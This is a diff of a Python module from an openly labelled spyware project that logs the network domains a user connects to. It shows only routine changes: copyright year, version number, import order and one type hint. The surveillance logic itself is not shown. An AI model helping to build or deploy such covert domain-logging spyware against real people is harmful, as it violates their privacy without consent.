@@ -3,7 +3,7 @@
 
 ###################
 #    This file implements a SpyWare for connection destinations.
-#    Copyright (C) 2021, 2022  Maurice Lambert
+#    Copyright (C) 2021, 2022, 2023  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -32,7 +32,7 @@ This file implements a SpyWare for connection destinations.
 >>> domainsSpy(argv=["DomainsLogger.py", "domainsSpy.conf"]) # (using argv)
 """
 
-__version__ = "1.0.0"
+__version__ = "1.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -44,7 +44,7 @@ license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/SpyWare"
 
 copyright = """
-SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
+SpyWare  Copyright (C) 2021, 2022, 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
@@ -57,14 +57,13 @@ __all__ = ["Daemon", "main", "CacheDNS", "CacheAppData", "config_load"]
 from os.path import join, expanduser, isdir, isfile, dirname, exists
 from os import device_encoding, environ, stat, access, R_OK
 from re import compile as cregex, Pattern
+from typing import List, Set, Iterable
 from configparser import ConfigParser
-from collections.abc import Iterator
 from subprocess import Popen, PIPE
 from mmap import mmap, ACCESS_READ
 from threading import Thread, Lock
 from traceback import print_exc
 from io import TextIOWrapper
-from typing import List, Set
 from platform import system
 from sys import argv, exit
 from time import sleep
@@ -325,7 +324,7 @@ class CacheAppData:
         self.extract_domain = CONFIGURATIONS.regex_domain.finditer
         self.interval_reading_file = CONFIGURATIONS.interval_reading_file
 
-    def domains_generator(self, directory: str) -> Iterator[List[bytes]]:
+    def domains_generator(self, directory: str) -> Iterable[List[bytes]]:
 
         """
         This function get recursives filenames.
